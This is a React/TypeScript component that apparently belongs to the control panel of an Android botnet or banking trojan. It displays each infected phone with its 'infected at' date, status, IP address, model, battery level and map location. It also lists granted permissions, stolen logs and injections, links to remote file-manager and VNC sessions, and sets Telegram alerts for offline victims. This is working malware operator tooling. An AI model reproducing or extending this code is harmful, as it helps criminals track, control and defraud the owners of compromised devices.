import React, {Dispatch, SetStateAction, useState} from "react";
import {Button, Checkbox, Col, Divider, Modal, Row, Space, Tag, Tooltip} from "antd";
import {Bot} from "../../../Model/Bot";
import {AppState} from "../../../Store/RootReducer";
import moment from "moment";
import {humanizeBotLastConnection} from "../../../Util/humanizeBotLastConnection";
import Permissions from "./Permissions";
import BotDataButtons from "./BotDataButtons";
import Injections from "./Injections";
import {changeSelectedBot} from "../../../Store/Bots/Actions";
import Actions from "./Actions";
import {useTranslation} from "react-i18next";
import BotInfo from "../../Modals/BotInfo/BotInfo";
import {NavLink} from "react-router-dom";
import SubInfo from "./SubInfo";
import {MapContainer, Marker, Popup, TileLayer} from "react-leaflet";
import {divIcon} from "leaflet";
import i18n from "i18next";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";
import useBreakpoint from "antd/es/grid/hooks/useBreakpoint";
import {LogButtonsProps} from "../../../Model/Commands";
import {updateUserTelegramBot} from "../../../Store/Auth/Actions";

interface BotsItemProps {
    bot: Bot,
    isLoaded: boolean,
    bots: Bot[],
    logsList: LogButtonsProps[],
    setSelectedBot: Dispatch<SetStateAction<Bot>>,
    setShowModal: (modal: string, show: boolean) => void,
}

export const botGeoTemplate = (bot: Bot) => {
    return (
        <>
            <div className="bot-geo-body" style={{height: 440}}>
                <MapContainer
                    center={[bot.location.lat, bot.location.lon]}
                    zoom={14}
                    scrollWheelZoom={false}
                >
                    <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
                    <Marker
                        position={[bot.location.lat, bot.location.lon]}
                        icon={divIcon({
                            html: "<i class='fa-solid fa-location-dot'></i>",
                            className: "map-pin",
                            iconSize: [30, 30],
                        })}
                    >
                        <Popup>{bot.id}</Popup>
                    </Marker>
                </MapContainer>
            </div>
        </>
    );
};

export const showBotGeo = (bot: Bot) => {
    Modal.success({
        title: null,
        icon: null,
        content: botGeoTemplate(bot),
        className: "bot-geo-modal",
        okText: i18n.t("CLOSE"),
        okButtonProps: {
            type: "default",
        },
    });
};

const BotsItem: React.FC<BotsItemProps> = (props: BotsItemProps) => {
    const lastConnectionDiff = moment().diff(moment(props.bot.updated_at)) / 1000;
    const lastConnectionStatus = lastConnectionDiff <= 60 ? "online" : (lastConnectionDiff >= 144000 ? "uninstalled": "offline");
    const botsReducer = useAppSelector((state: AppState) => state.bots);
    const authReducer = useAppSelector((state: AppState) => state.auth);
    const isSelected = botsReducer.selectedBots.filter((bot: Bot) => {
        return props.bot.id === bot.id;
    }).length > 0;
    const dispatch = useAppDispatch();
    const {t} = useTranslation();
    const [showBotInfo, setShowBotInfo] = useState(false);
    const [botData, setBotData] = useState<Bot>();
    const showBotInfoModal = (bot: Bot) => {
        setBotData(bot);
        setShowBotInfo(true);
    };

    const screenResolution = props.bot.metadata?.screenResolution;
    const screens = useBreakpoint();

    return (
        <Col xxl={6} xl={12} lg={12} md={12} sm={24} xs={24} className={isSelected ? "bot-col selected" : "bot-col"}>
            <div className={`bot-item ${lastConnectionStatus}`}>
                <div>
                    <div className="bot-item-head">
                        <div className="bot-item-version">
                            <i className="fa-brands fa-android" />
                            <span className="bot-item-version-value">
                                <span style={{fontSize: 12}}>v.{props.bot.metadata.version}</span>
                            </span>
                        </div>
                        <div className="bot-item-head-content">
                            <div style={{lineHeight: 2}}>
                                <a onClick={() => showBotInfoModal(props.bot)}>{props.bot.id}</a>
                            </div>
                            <div style={{display: "flex", alignItems: "center", gap: 8}}>
                                <div style={{display: "flex", alignItems: "center", gap: 8}}>
                                    <div className="bot-item-status" /> {lastConnectionStatus}
                                </div>

                                <Tag className="bot-item-tag">{props.bot.tag}</Tag>

                                {!screens.xs && (
                                    <>
                                        {lastConnectionStatus === "uninstalled" || lastConnectionStatus === "offline" ? (
                                            <Tooltip title={t("NOTIFY_TELEGRAM")}>
                                                <Checkbox
                                                    checked={authReducer.user.telegramBots.includes(props.bot.id)}
                                                    onChange={
                                                        (e) => {
                                                            dispatch(updateUserTelegramBot(
                                                                e.target.checked,
                                                                props.bot.id,
                                                            ));
                                                        }
                                                    }
                                                    className="ant-checkbox-tg"
                                                    style={{transform: "scale(1.3)"}}
                                                />
                                            </Tooltip>
                                        ) : ""}
                                    </>
                                )}
                            </div>
                        </div>

                        <div className={isSelected ? "bot-item-select selected" : "bot-item-select"}>
                            <Checkbox
                                style={{transform: "scale(1.5)"}}
                                checked={isSelected}
                                onChange={() => dispatch(changeSelectedBot(props.bot))}
                            />
                        </div>
                    </div>
                    <div className="bot-item-body">
                        <div className="bot-item-row">
                            <div className="bot-item-status-inner">
                                <div>
                                    <Divider orientation="center" style={{marginBottom: 0}}>
                                        {t("BOT_LAST_ONLINE")}: {props.bot.last_connection ? props.bot.last_connection : t("BOT_LAST_ONLINE_NO_DATA")}
                                        <br/>
                                        {t("BOT_INFECTED_AT")}: {props.bot.created_at ? props.bot.created_at : t("BOT_LAST_ONLINE_NO_DATA")}
                                    </Divider>
                                    <div style={{display: "flex", justifyContent: "center"}}>
                                        <Tag>
                                            {humanizeBotLastConnection(lastConnectionDiff)}
                                        </Tag>
                                    </div>
                                    <div style={{display: "flex", justifyContent: "center"}}>
                                        {screens.xs && (
                                            <>
                                                {lastConnectionStatus === "uninstalled" || lastConnectionStatus === "offline" ? (
                                                    <Checkbox className="ant-checkbox-tg">
                                                        {t("NOTIFY_TELEGRAM")}
                                                    </Checkbox>
                                                ) : ""}
                                            </>
                                        )}
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="bot-item-row">
                            <Divider style={{marginBottom: 0}}>
                                {t("BOT_GEOLOCATION")}
                            </Divider>
                            <Space direction="vertical">
                                <div>
                                    <Space align="baseline">
                                        <i className="fa-solid fa-mobile" style={{fontSize: 22}} />
                                        <span>
                                            {t("BOT_MODEL")}: {props.bot.metadata.manufacturer} {props.bot.metadata.device}
                                        </span>
                                    </Space>
                                </div>
                                {screenResolution && (
                                    <div>
                                        <Space align="baseline">
                                            <i className="fa-solid fa-mobile-screen" style={{fontSize: 22}} />
                                            <span>
                                                {t("SCREEN_SIZE")}: {screenResolution?.width}x{screenResolution?.height}
                                            </span>
                                        </Space>
                                    </div>
                                )}
                                {props.bot.comment && (
                                    <div>
                                        <Space align="baseline">
                                            <i className="fa-solid fa-mobile-screen" style={{fontSize: 22}} />
                                            <span>
                                                {props.bot.comment}
                                            </span>
                                        </Space>
                                    </div>
                                )}
                                <Space>
                                    <img
                                        width={16}
                                        alt={props.bot.country_code.toUpperCase()}
                                        src={`https://purecatamphetamine.github.io/country-flag-icons/3x2/${props.bot.country_code.toUpperCase()}.svg`}
                                    />

                                    <span>
                                        {t("BOT_COUNTRY")}: {props.bot.country}
                                    </span>

                                    {props.bot.location && (
                                        <Button
                                            icon={(
                                                <span className="anticon">
                                                    <i className="fa-solid fa-sharp fa-location-dot" />
                                                </span>
                                            )}
                                            onClick={() => showBotGeo(props.bot)}
                                        >
                                            {t("GEOLOCATION")}
                                        </Button>
                                    )}
                                </Space>
                                <div>
                                    <Space>
                                        <i className="fa-solid fa-wifi" />
                                        <span>
                                            {props.bot.ip || "unknown"}
                                        </span>
                                    </Space>
                                </div>
                                <div>
                                    <Space>
                                        <i className="fa-solid fa-battery-half" style={{fontSize: 16}} />
                                        <span>
                                            {props.bot.sub_info.batteryLevel + "%"}
                                        </span>
                                    </Space>
                                </div>
                            </Space>

                            <div style={{display: "flex", justifyContent: "center", marginTop: 15, gridColumnGap: 15}}>
                                <NavLink to={"/filemanager?bot_id=" + props.bot.id}>
                                    <Button
                                        type="dashed"
                                        size="large"
                                        icon={(
                                            <span className="anticon">
                                                <i className="fa-regular fa-folder" />
                                            </span>
                                        )}
                                    >
                                        {t("BOT_START_FTP_SESSION")}
                                    </Button>
                                </NavLink>
                                <NavLink to={"/vnc?bot_id=" + props.bot.id}>
                                    <Button
                                        type="dashed"
                                        size="large"
                                        icon={(
                                            <span className="anticon">
                                                <i className="icon-vnc" style={{fontSize: 24}} />
                                            </span>
                                        )}
                                    />
                                </NavLink>
                            </div>
                        </div>

                        <div className="bot-item-row">
                            <Row gutter={30}>
                                <Col span={12}>
                                    <Divider orientation="center" style={{margin: "5px 0"}}>
                                        {t("BOT_PERMISSIONS")}
                                    </Divider>
                                    <Permissions bot={props.bot} />
                                </Col>
                                <Col span={12}>
                                    <Divider orientation="center" style={{margin: "5px 0"}}>
                                        {t("BOT_SUB_INFO")}
                                    </Divider>
                                    <SubInfo bot={props.bot} />
                                </Col>
                                <Col span={24}>
                                    <Divider orientation="center" style={{margin: "5px 0"}}>
                                        {t("BOT_LOGS")}
                                    </Divider>
                                    <BotDataButtons
                                        bot={props.bot}
                                        logsList={props.logsList}
                                        setSelectedBot={props.setSelectedBot}
                                        setShowModal={props.setShowModal}
                                    />
                                </Col>
                            </Row>
                        </div>

                        <div className="bot-item-row">
                            <Injections bot={props.bot} renderType={"cards"} />
                        </div>
                    </div>
                </div>

                <Actions bot={props.bot} />
            </div>

            {botData && (
                <BotInfo bot={botData} visible={showBotInfo} setVisible={setShowBotInfo} />
            )}
        </Col>
    );
};

export default BotsItem;
